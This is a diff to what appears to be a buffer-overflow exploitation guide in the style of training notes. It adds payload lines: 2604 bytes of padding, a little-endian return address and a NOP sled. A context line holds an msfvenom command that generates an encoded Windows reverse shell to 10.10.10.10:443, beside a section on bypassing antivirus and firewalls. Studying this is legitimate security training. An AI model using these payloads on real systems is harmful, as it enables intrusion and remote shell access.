@@ -149,13 +149,19 @@ Using Mona:
  
 <h4>7. Update skeleton script to include Ret Address (little endian) right after the buffer </h4>
 
+        buffer = "A" * 2604 + "\x8f\x35\x4a\x6f" 
+
 <h4>8. Update skeleton script to include NOPs for padding at the beggining of the shellcode</h4>
+
+        buffer = "A" * 2604 + "\x8f\x35\x4a\x6f" + "\x90" * 8 
 
 <h4>9. Generate shellcode and update skeleton script </h4>
 
     msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a" 
-    
-<b> Bypassing AV and FW restrictions </b>
+
+        buffer = "A" * 2604 + "\x8f\x35\x4a\x6f" + "\x90" * 8 + shellcode
+   
+<h4> Bypassing AV and FW restrictions </h4>
 
 <h4>10. Use staged payloads </h4>
 
